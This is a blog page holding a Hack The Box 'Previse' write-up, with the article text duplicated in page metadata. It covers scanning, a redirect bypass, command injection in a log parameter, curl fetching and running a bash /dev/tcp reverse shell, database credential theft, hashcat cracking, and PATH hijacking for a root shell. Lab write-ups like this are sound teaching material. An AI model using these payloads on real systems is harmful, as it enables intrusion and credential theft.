<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Previse | My New Hugo Site</title><meta name=keywords content="hackthebox,linux,idor,command-injection"><meta name=description content="previse"><meta name=author content="Theme PaperMod"><link rel=canonical href=https://H3r1CH.github.io/writeups/hackthebox/previse/><link crossorigin=anonymous href=/assets/css/stylesheet.bc1149f4a72aa4858d3a9f71462f75e5884ffe8073ea9d6d5761d5663d651e20.css integrity="sha256-vBFJ9KcqpIWNOp9xRi915YhP/oBz6p1tV2HVZj1lHiA=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://H3r1CH.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://H3r1CH.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://H3r1CH.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://H3r1CH.github.io/apple-touch-icon.png><link rel=mask-icon href=https://H3r1CH.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style></noscript><meta property="og:title" content="Previse"><meta property="og:description" content="previse"><meta property="og:type" content="article"><meta property="og:url" content="https://H3r1CH.github.io/writeups/hackthebox/previse/"><meta property="og:image" content="https://H3r1CH.github.io/papermod-cover.png"><meta property="article:section" content="writeups"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://H3r1CH.github.io/papermod-cover.png"><meta name=twitter:title content="Previse"><meta name=twitter:description content="previse"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Writeups","item":"https://H3r1CH.github.io/writeups/"},{"@type":"ListItem","position":2,"name":"Hack The Box","item":"https://H3r1CH.github.io/writeups/hackthebox/"},{"@type":"ListItem","position":3,"name":"Previse","item":"https://H3r1CH.github.io/writeups/hackthebox/previse/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Previse","name":"Previse","description":"previse","keywords":["hackthebox","linux","idor","command-injection"],"articleBody":" Scanning \u0026 Enumeration nmap Started with an nmap scan:\nTCP all ports kali@kali:~/ctf/htb/machines/previse$ sudo nmap T4 -p- 10.10.11.104 -oA nmap/tcp_all_ports [sudo] password for kali: Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-13 17:56 EDT Failed to resolve \"T4\". Nmap scan report for 10.10.11.104 Host is up (0.022s latency). Not shown: 65533 closed tcp ports (reset) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http TCP with scripts against found ports kali@kali:~/ctf/htb/machines/previse$ sudo nmap -sCV -p22,80 10.10.11.104 -oA nmap/tcp_scripts [sudo] password for kali: Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-13 18:17 EDT Nmap scan report for 10.10.11.104 Host is up (0.019s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA) | 256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA) |_ 256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) | http-title: Previse Login |_Requested resource was login.php | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-server-header: Apache/2.4.29 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Enumeration Web Page Opening up the web page it looks to be a generic Login form for a File Storage site. The login.php shows that the site is running on PHP. gobuster When navigating to the web page it shows that that PHP is being used so that can be added to an extension type for the directory busting.\nkali@kali:~/ctf/htb/machines/previse$ sudo gobuster dir -u http://10.10.11.104/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php -o gobuster_80 -q /index.php (Status: 302) [Size: 2801] [--\u003e login.php] /download.php (Status: 302) [Size: 0] [--\u003e login.php] /login.php (Status: 200) [Size: 2224] /files.php (Status: 302) [Size: 4914] [--\u003e login.php] /header.php (Status: 200) [Size: 980] /nav.php (Status: 200) [Size: 1248] /footer.php (Status: 200) [Size: 217] /css (Status: 301) [Size: 310] [--\u003e http://10.10.11.104/css/] /status.php (Status: 302) [Size: 2966] [--\u003e login.php] /js (Status: 301) [Size: 309] [--\u003e http://10.10.11.104/js/] /logout.php (Status: 302) [Size: 0] [--\u003e login.php] /accounts.php (Status: 302) [Size: 3994] [--\u003e login.php] /config.php (Status: 200) [Size: 0] /logs.php (Status: 302) [Size: 0] [--\u003e login.php] /server-status (Status: 403) [Size: 277] Looks like a lot of files are redirecting back to the login.php page hinting at needing credentials.\n/nav.php page On the nav.php page, each link can be intercepted using Burp Suite, to see what can be done with the requests. When selecting the CREATE ACCOUNT link, the below request is made: When intercepting the response to this request, there is a 302 response is returned and some page data can be seen. Modifying the 302 to a 200, allows access to account.php where a new account can be created. /accounts.php After creating a new account, and then logging into that account, additional enumeration can be done.\n/status.php The status.php page reveals that the web site is using a MySQL server, that there are two registered admins, and one file has been uploaded. /files.php The files.php page shows an upload field and the file that have been uploaded. After downloading and extracting the SITEBACKUP.ZIP file a new page called file_logs.php is identified.\n/file_logs.php When navigating to that page log data can be requested where the file delimiter can be specified from a drop down. After selecting SUBMIT and intercepting the request, the below request is captured, with a delim variable and parameter set. Command Injection When testing for command injection against the delim parameter it is possible to send a request from the target machine.\nPython Web Server Started a web server to try an catch a request from the target.\nkali@kali:~/ctf/htb/machines/previse/siteBackup1$ python3 -m http.server Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... Burp request Modifying the request to send a curl request to our attack machine. And it can be seen that the request is made to the Python web server.\nkali@kali:~/ctf/htb/machines/previse/siteBackup1$ python3 -m http.server Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... 10.10.11.104 - - [13/Aug/2022 19:47:48] \"GET / HTTP/1.1\" 200 - Reverse Shell Now to create a reverse shell file to host via the Python web server and use curl again to get a reverse shell.\nkali@kali:~/ctf/htb/machines/previse$ echo 'bash -i \u003e\u0026 /dev/tcp/10.10.14.5/4444 0\u003e\u00261' \u003e revshell.sh Started a netcat listener:\nkali@kali:~/ctf/htb/machines/previse$ nc -lvnp 4444 listening on [any] 4444 ... Modify the Burp request again to download and execute the revshell.sh file And a reverse shell is returned as the www-data user:\nconnect to [10.10.14.5] from (UNKNOWN) [10.10.11.104] 49900 bash: cannot set terminal process group (1399): Inappropriate ioctl for device bash: no job control in this shell www-data@previse:/var/www/html$ www-data@previse:/var/www/html$ whoami www-data www-data@previse:/var/www/html$ hostname previse Shell upgrade:\nwww-data@previse:/var/www/html$ python3 -c 'import pty; pty.spawn(\"/bin/bash\")' www-data@previse:/var/www/html$ export TERM=xterm m4lwhere user Database Looking in the config.php file there are credentials to a database:\nwww-data@previse:/var/www/html$ cat config.php \u003c?php function connectDB(){ $host = 'localhost'; $user = 'root'; $passwd = 'mySQL_p@ssw0rd!:)'; $db = 'previse'; $mycon = new mysqli($host, $user, $passwd, $db); return $mycon; } ?\u003e Connecting to the database and viewing its data:\nwww-data@previse:/var/www/html$ mysql -h localhost -u root -p'mySQL_p@ssw0rd!:)' mysql\u003e show databases; show databases; +--------------------+ | Database | +--------------------+ | information_schema | | mysql | | performance_schema | | previse | | sys | +--------------------+ mysql\u003e use previse; mysql\u003e show tables; show tables; +-------------------+ | Tables_in_previse | +-------------------+ | accounts | | files | +-------------------+ mysql\u003e select * from accounts; +----+----------+------------------------------------+---------------------+ | id | username | password | created_at | +----+----------+------------------------------------+---------------------+ | 1 | m4lwhere | $1$ðŸ§‚llol$DQpmdvnb7EeuO6UaqRItf. | 2021-05-27 18:18:36 | | 2 | tester | $1$ðŸ§‚llol$UfA76/dcHlnMNoOlgyaZq1 | 2022-08-13 23:23:06 | +----+----------+------------------------------------+---------------------+ The database shows a couple accounts, including m4lwhere, who is the only user on the machine. Now to crack the password hash for the m4lwhere user.\nPassword Crack Copying the hash to a file called hash.txt and running hashcat against it to crack it. The password looks to be a md5crypt (based on https://hashcat.net/wiki/doku.php?id=example_hashes)\nkali@kali:~/ctf/htb/machines/previse$ hashcat -m 500 hash.txt /usr/share/wordlists/rockyou.txt ... $1$ðŸ§‚llol$DQpmdvnb7EeuO6UaqRItf.:ilovecody112235! SSH Now with the cracked password hash, the m4lwhere user can be logged into over SSH.\nkali@kali:~/ctf/htb/machines/previse$ ssh m4lwhere@10.10.11.104 m4lwhere@10.10.11.104's password: ilovecody112235! And a shell as the m4lwhere user is gained:\nWelcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-151-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Sun Aug 14 00:31:06 UTC 2022 System load: 0.0 Processes: 180 Usage of /: 51.3% of 4.85GB Users logged in: 0 Memory usage: 28% IP address for eth0: 10.10.11.104 Swap usage: 0% 0 updates can be applied immediately. Last login: Fri Jun 18 01:09:10 2021 from 10.10.10.5 m4lwhere@previse:~$ whoami m4lwhere m4lwhere@previse:~$ id uid=1000(m4lwhere) gid=1000(m4lwhere) groups=1000(m4lwhere) m4lwhere@previse:~$ hostname previse user.txt m4lwhere@previse:~$ cat user.txt 652e288e09fd164a... root sudo -l Checking the sudo privileges the m4lwhere has:\nm4lwhere@previse:~$ sudo -l [sudo] password for m4lwhere: User m4lwhere may run the following commands on previse: (root) /opt/scripts/access_backup.sh Looking at the script that can be run with root privileges:\nm4lwhere@previse:~$ cat /opt/scripts/access_backup.sh #!/bin/bash # We always make sure to store logs, we take security SERIOUSLY here # I know I shouldnt run this as root but I cant figure it out programmatically on my account # This is configured to run with cron, added to sudo so I can run as needed - we'll fix it later when there's time gzip -c /var/log/apache2/access.log \u003e /var/backups/$(date --date=\"yesterday\" +%Y%b%d)_access.gz gzip -c /var/www/file_access.log \u003e /var/backups/$(date --date=\"yesterday\" +%Y%b%d)_file_access.gz It looks like the gzip command is using the date command without specifying the full path. So it should be possible to create a malicious date file, add that to the beginning of the m4lwhere userâ€™s PATH, and have it executed within the access_backup.sh script as root.\nm4lwhere@previse:~$ echo 'bash -i \u003e\u0026 /dev/tcp/10.10.14.5/4444 0\u003e\u00261' \u003e date m4lwhere@previse:~$ cat date bash -i \u003e\u0026 /dev/tcp/10.10.14.5/4444 0\u003e\u00261 m4lwhere@previse:~$ chmod +x date m4lwhere@previse:~$ export PATH=/home/m4lwhere/:$PATH Started a netcat listener:\nkali@kali:~/ctf/htb/machines/previse$ nc -lvnp 4444 listening on [any] 4444 ... Executed the access_backup.sh script with sudo:\nm4lwhere@previse:~$ sudo /opt/scripts/access_backup.sh And the reverse shell returns with root access:\nconnect to [10.10.14.5] from (UNKNOWN) [10.10.11.104] 50360 root@previse:~# root@previse:~# whoami whoami root root@previse:~# id id uid=0(root) gid=0(root) groups=0(root) root@previse:~# hostname hostname previse root.txt root@previse:/root# cat root.txt cat root.txt a01417a61ab18617... ","wordCount":"1308","inLanguage":"en","datePublished":"0001-01-01T00:00:00Z","dateModified":"0001-01-01T00:00:00Z","author":{"@type":"Person","name":"Theme PaperMod"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://H3r1CH.github.io/writeups/hackthebox/previse/"},"publisher":{"@type":"Organization","name":"My New Hugo Site","logo":{"@type":"ImageObject","url":"https://H3r1CH.github.io/favicon.ico"}}}</script></head><body class=dark id=top><script>localStorage.getItem("pref-theme")==="light"&&document.body.classList.remove("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://H3r1CH.github.io/ accesskey=h title="My New Hugo Site (Alt + H)">My New Hugo Site</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://H3r1CH.github.io/archives title=Archive><span>Archive</span></a></li><li><a href=https://H3r1CH.github.io/search/ title="Search (Alt + /)" accesskey=/><span>Search</span></a></li><li><a href=https://H3r1CH.github.io/tags/ title=Tags><span>Tags</span></a></li><li><a href=https://H3r1CH.github.io/writeups/ title=Writeups><span>Writeups</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://H3r1CH.github.io/>Home</a>&nbsp;Â»&nbsp;<a href=https://H3r1CH.github.io/writeups/>Writeups</a>&nbsp;Â»&nbsp;<a href=https://H3r1CH.github.io/writeups/hackthebox/>Hack The Box</a></div><h1 class=post-title>Previse</h1><div class=post-meta>7 min&nbsp;Â·&nbsp;Theme PaperMod</div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><ul><li><a href=#scanning--enumeration aria-label="Scanning &amp;amp; Enumeration">Scanning & Enumeration</a><ul><li><a href=#nmap aria-label=nmap>nmap</a></li></ul></li><li><a href=#enumeration aria-label=Enumeration>Enumeration</a><ul><li><a href=#web-page aria-label="Web Page">Web Page</a></li><li><a href=#gobuster aria-label=gobuster>gobuster</a></li><li><a href=#navphp-page aria-label="/nav.php page">/nav.php page</a></li><li><a href=#accountsphp aria-label=/accounts.php>/accounts.php</a></li><li><a href=#statusphp aria-label=/status.php>/status.php</a></li><li><a href=#filesphp aria-label=/files.php>/files.php</a></li><li><a href=#file_logsphp aria-label=/file_logs.php>/file_logs.php</a></li></ul></li><li><a href=#command-injection aria-label="Command Injection">Command Injection</a><ul><li><a href=#python-web-server aria-label="Python Web Server">Python Web Server</a></li><li><a href=#burp-request aria-label="Burp request">Burp request</a></li><li><a href=#reverse-shell aria-label="Reverse Shell">Reverse Shell</a></li></ul></li><li><a href=#m4lwhere-user aria-label="m4lwhere user">m4lwhere user</a><ul><li><a href=#database aria-label=Database>Database</a></li><li><a href=#password-crack aria-label="Password Crack">Password Crack</a></li><li><a href=#ssh aria-label=SSH>SSH</a><ul><li><a href=#usertxt aria-label=user.txt>user.txt</a></li></ul></li></ul></li><li><a href=#root aria-label=root>root</a><ul><li><a href=#sudo--l aria-label="sudo -l">sudo -l</a><ul><li><a href=#roottxt aria-label=root.txt>root.txt</a></li></ul></li></ul></li></ul></div></details></div><div class=post-content><p><img loading=lazy src=/Previse.png alt=Previse></p><h2 id=scanning--enumeration>Scanning & Enumeration<a hidden class=anchor aria-hidden=true href=#scanning--enumeration>#</a></h2><h3 id=nmap>nmap<a hidden class=anchor aria-hidden=true href=#nmap>#</a></h3><p>Started with an <code>nmap</code> scan:</p><ul><li>TCP all ports</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>kali@kali:~/ctf/htb/machines/previse$ sudo nmap T4 -p- 10.10.11.104 -oA nmap/tcp_all_ports
</span></span><span class=line><span class=cl><span class=o>[</span>sudo<span class=o>]</span> password <span class=k>for</span> kali:
</span></span><span class=line><span class=cl>Starting Nmap 7.92 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2022-08-13 17:56 EDT
</span></span><span class=line><span class=cl>Failed to resolve <span class=s2>&#34;T4&#34;</span>.
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.10.11.104
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.022s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>Not shown: <span class=m>65533</span> closed tcp ports <span class=o>(</span>reset<span class=o>)</span>
</span></span><span class=line><span class=cl>PORT Â  STATE SERVICE
</span></span><span class=line><span class=cl>22/tcp open Â ssh
</span></span><span class=line><span class=cl>80/tcp open Â http
</span></span></code></pre></div><ul><li>TCP with scripts against found ports</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>kali@kali:~/ctf/htb/machines/previse$ sudo nmap -sCV -p22,80 10.10.11.104 -oA nmap/tcp_scripts
</span></span><span class=line><span class=cl><span class=o>[</span>sudo<span class=o>]</span> password <span class=k>for</span> kali: 
</span></span><span class=line><span class=cl>Starting Nmap 7.92 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2022-08-13 18:17 EDT
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.10.11.104
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.019s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>PORT   STATE SERVICE VERSION
</span></span><span class=line><span class=cl>22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class=o>(</span>Ubuntu Linux<span class=p>;</span> protocol 2.0<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> ssh-hostkey: 
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>2048</span> 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 <span class=o>(</span>RSA<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>256</span> bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 <span class=o>(</span>ECDSA<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_  <span class=m>256</span> 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 <span class=o>(</span>ED25519<span class=o>)</span>
</span></span><span class=line><span class=cl>80/tcp open  http    Apache httpd 2.4.29 <span class=o>((</span>Ubuntu<span class=o>))</span>
</span></span><span class=line><span class=cl><span class=p>|</span> http-title: Previse Login
</span></span><span class=line><span class=cl><span class=p>|</span>_Requested resource was login.php
</span></span><span class=line><span class=cl><span class=p>|</span> http-cookie-flags: 
</span></span><span class=line><span class=cl><span class=p>|</span>   /: 
</span></span><span class=line><span class=cl><span class=p>|</span>     PHPSESSID: 
</span></span><span class=line><span class=cl><span class=p>|</span>_      httponly flag not <span class=nb>set</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Apache/2.4.29 <span class=o>(</span>Ubuntu<span class=o>)</span>
</span></span><span class=line><span class=cl>Service Info: OS: Linux<span class=p>;</span> CPE: cpe:/o:linux:linux_kernel
</span></span></code></pre></div><h2 id=enumeration>Enumeration<a hidden class=anchor aria-hidden=true href=#enumeration>#</a></h2><h3 id=web-page>Web Page<a hidden class=anchor aria-hidden=true href=#web-page>#</a></h3><p>Opening up the web page it looks to be a generic Login form for a File Storage site. The login.php shows that the site is running on PHP.
<img loading=lazy src=/previse-login_page.png alt></p><h3 id=gobuster>gobuster<a hidden class=anchor aria-hidden=true href=#gobuster>#</a></h3><p>When navigating to the web page it shows that that PHP is being used so that can be added to an extension type for the directory busting.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>kali@kali:~/ctf/htb/machines/previse$ sudo gobuster dir -u http://10.10.11.104/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php -o gobuster_80 -q
</span></span><span class=line><span class=cl>/index.php            <span class=o>(</span>Status: 302<span class=o>)</span> <span class=o>[</span>Size: 2801<span class=o>]</span> <span class=o>[</span>--&gt; login.php<span class=o>]</span>
</span></span><span class=line><span class=cl>/download.php         <span class=o>(</span>Status: 302<span class=o>)</span> <span class=o>[</span>Size: 0<span class=o>]</span> <span class=o>[</span>--&gt; login.php<span class=o>]</span>   
</span></span><span class=line><span class=cl>/login.php            <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 2224<span class=o>]</span>                
</span></span><span class=line><span class=cl>/files.php            <span class=o>(</span>Status: 302<span class=o>)</span> <span class=o>[</span>Size: 4914<span class=o>]</span> <span class=o>[</span>--&gt; login.php<span class=o>]</span>
</span></span><span class=line><span class=cl>/header.php           <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 980<span class=o>]</span>                 
</span></span><span class=line><span class=cl>/nav.php              <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 1248<span class=o>]</span>                
</span></span><span class=line><span class=cl>/footer.php           <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 217<span class=o>]</span>                 
</span></span><span class=line><span class=cl>/css                  <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 310<span class=o>]</span> <span class=o>[</span>--&gt; http://10.10.11.104/css/<span class=o>]</span>
</span></span><span class=line><span class=cl>/status.php           <span class=o>(</span>Status: 302<span class=o>)</span> <span class=o>[</span>Size: 2966<span class=o>]</span> <span class=o>[</span>--&gt; login.php<span class=o>]</span>              
</span></span><span class=line><span class=cl>/js                   <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 309<span class=o>]</span> <span class=o>[</span>--&gt; http://10.10.11.104/js/<span class=o>]</span> 
</span></span><span class=line><span class=cl>/logout.php           <span class=o>(</span>Status: 302<span class=o>)</span> <span class=o>[</span>Size: 0<span class=o>]</span> <span class=o>[</span>--&gt; login.php<span class=o>]</span>                 
</span></span><span class=line><span class=cl>/accounts.php         <span class=o>(</span>Status: 302<span class=o>)</span> <span class=o>[</span>Size: 3994<span class=o>]</span> <span class=o>[</span>--&gt; login.php<span class=o>]</span>              
</span></span><span class=line><span class=cl>/config.php           <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 0<span class=o>]</span>                                 
</span></span><span class=line><span class=cl>/logs.php             <span class=o>(</span>Status: 302<span class=o>)</span> <span class=o>[</span>Size: 0<span class=o>]</span> <span class=o>[</span>--&gt; login.php<span class=o>]</span>                 
</span></span><span class=line><span class=cl>/server-status        <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 277<span class=o>]</span>                               
</span></span></code></pre></div><p>Looks like a lot of files are redirecting back to the login.php page hinting at needing credentials.</p><h3 id=navphp-page>/nav.php page<a hidden class=anchor aria-hidden=true href=#navphp-page>#</a></h3><p>On the nav.php page, each link can be intercepted using Burp Suite, to see what can be done with the requests.
<img loading=lazy src=/previse-nav_page.png alt>
When selecting the CREATE ACCOUNT link, the below request is made:
<img loading=lazy src=/previse-accounts_get.png alt>
When intercepting the response to this request, there is a 302 response is returned and some page data can be seen.
<img loading=lazy src=/previse-accounts_302.png alt>
Modifying the 302 to a 200, allows access to account.php where a new account can be created.
<img loading=lazy src=/previse-accounts_200.png alt></p><h3 id=accountsphp>/accounts.php<a hidden class=anchor aria-hidden=true href=#accountsphp>#</a></h3><p><img loading=lazy src=/previse-accounts_page.png alt>
After creating a new account, and then logging into that account, additional enumeration can be done.</p><h3 id=statusphp>/status.php<a hidden class=anchor aria-hidden=true href=#statusphp>#</a></h3><p>The status.php page reveals that the web site is using a MySQL server, that there are two registered admins, and one file has been uploaded.
<img loading=lazy src=/previse-status_page.png alt></p><h3 id=filesphp>/files.php<a hidden class=anchor aria-hidden=true href=#filesphp>#</a></h3><p>The files.php page shows an upload field and the file that have been uploaded.
<img loading=lazy src=/previse-files_page.png alt>
After downloading and extracting the SITEBACKUP.ZIP file a new page called file_logs.php is identified.</p><h3 id=file_logsphp>/file_logs.php<a hidden class=anchor aria-hidden=true href=#file_logsphp>#</a></h3><p>When navigating to that page log data can be requested where the file delimiter can be specified from a drop down.
<img loading=lazy src=/previse-file_logs_page.png alt>
After selecting SUBMIT and intercepting the request, the below request is captured, with a <code>delim</code> variable and parameter set.
<img loading=lazy src=/previse-logs_page.png alt></p><h2 id=command-injection>Command Injection<a hidden class=anchor aria-hidden=true href=#command-injection>#</a></h2><p>When testing for command injection against the <code>delim</code> parameter it is possible to send a request from the target machine.</p><h3 id=python-web-server>Python Web Server<a hidden class=anchor aria-hidden=true href=#python-web-server>#</a></h3><p>Started a web server to try an catch a request from the target.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>kali@kali:~/ctf/htb/machines/previse/siteBackup1$ python3 -m http.server
</span></span><span class=line><span class=cl>Serving HTTP on 0.0.0.0 port <span class=m>8000</span> <span class=o>(</span>http://0.0.0.0:8000/<span class=o>)</span> ...
</span></span></code></pre></div><h3 id=burp-request>Burp request<a hidden class=anchor aria-hidden=true href=#burp-request>#</a></h3><p>Modifying the request to send a <code>curl</code> request to our attack machine.
<img loading=lazy src=/previse-ci_burp_req.png alt>
And it can be seen that the request is made to the Python web server.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>kali@kali:~/ctf/htb/machines/previse/siteBackup1$ python3 -m http.server
</span></span><span class=line><span class=cl>Serving HTTP on 0.0.0.0 port <span class=m>8000</span> <span class=o>(</span>http://0.0.0.0:8000/<span class=o>)</span> ...
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>10.10.11.104 - - <span class=o>[</span>13/Aug/2022 19:47:48<span class=o>]</span> <span class=s2>&#34;GET / HTTP/1.1&#34;</span> <span class=m>200</span> -
</span></span></code></pre></div><h3 id=reverse-shell>Reverse Shell<a hidden class=anchor aria-hidden=true href=#reverse-shell>#</a></h3><p>Now to create a reverse shell file to host via the Python web server and use curl again to get a reverse shell.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>kali@kali:~/ctf/htb/machines/previse$ <span class=nb>echo</span> <span class=s1>&#39;bash -i &gt;&amp; /dev/tcp/10.10.14.5/4444 0&gt;&amp;1&#39;</span> &gt; revshell.sh
</span></span></code></pre></div><p>Started a <code>netcat</code> listener:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>kali@kali:~/ctf/htb/machines/previse$ nc -lvnp <span class=m>4444</span>
</span></span><span class=line><span class=cl>listening on <span class=o>[</span>any<span class=o>]</span> <span class=m>4444</span> ...
</span></span></code></pre></div><p>Modify the Burp request again to download and execute the revshell.sh file
<img loading=lazy src=/previse-ci_shell_burp_req.png alt>
And a reverse shell is returned as the www-data user:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>connect to <span class=o>[</span>10.10.14.5<span class=o>]</span> from <span class=o>(</span>UNKNOWN<span class=o>)</span> <span class=o>[</span>10.10.11.104<span class=o>]</span> <span class=m>49900</span>
</span></span><span class=line><span class=cl>bash: cannot <span class=nb>set</span> terminal process group <span class=o>(</span>1399<span class=o>)</span>: Inappropriate ioctl <span class=k>for</span> device
</span></span><span class=line><span class=cl>bash: no job control in this shell
</span></span><span class=line><span class=cl>www-data@previse:/var/www/html$ 
</span></span><span class=line><span class=cl>www-data@previse:/var/www/html$ whoami
</span></span><span class=line><span class=cl>www-data
</span></span><span class=line><span class=cl>www-data@previse:/var/www/html$ hostname
</span></span><span class=line><span class=cl>previse
</span></span></code></pre></div><p>Shell upgrade:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>www-data@previse:/var/www/html$ python3 -c <span class=s1>&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</span></span><span class=line><span class=cl>www-data@previse:/var/www/html$ <span class=nb>export</span> <span class=nv>TERM</span><span class=o>=</span>xterm
</span></span></code></pre></div><h2 id=m4lwhere-user>m4lwhere user<a hidden class=anchor aria-hidden=true href=#m4lwhere-user>#</a></h2><h3 id=database>Database<a hidden class=anchor aria-hidden=true href=#database>#</a></h3><p>Looking in the config.php file there are credentials to a database:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>www-data@previse:/var/www/html$ cat config.php  
</span></span><span class=line><span class=cl>&lt;?php
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>function</span> connectDB<span class=o>(){</span>
</span></span><span class=line><span class=cl>    <span class=nv>$host</span> <span class=o>=</span> <span class=s1>&#39;localhost&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nv>$user</span> <span class=o>=</span> <span class=s1>&#39;root&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nv>$passwd</span> <span class=o>=</span> <span class=s1>&#39;mySQL_p@ssw0rd!:)&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nv>$db</span> <span class=o>=</span> <span class=s1>&#39;previse&#39;</span><span class=p>;</span>
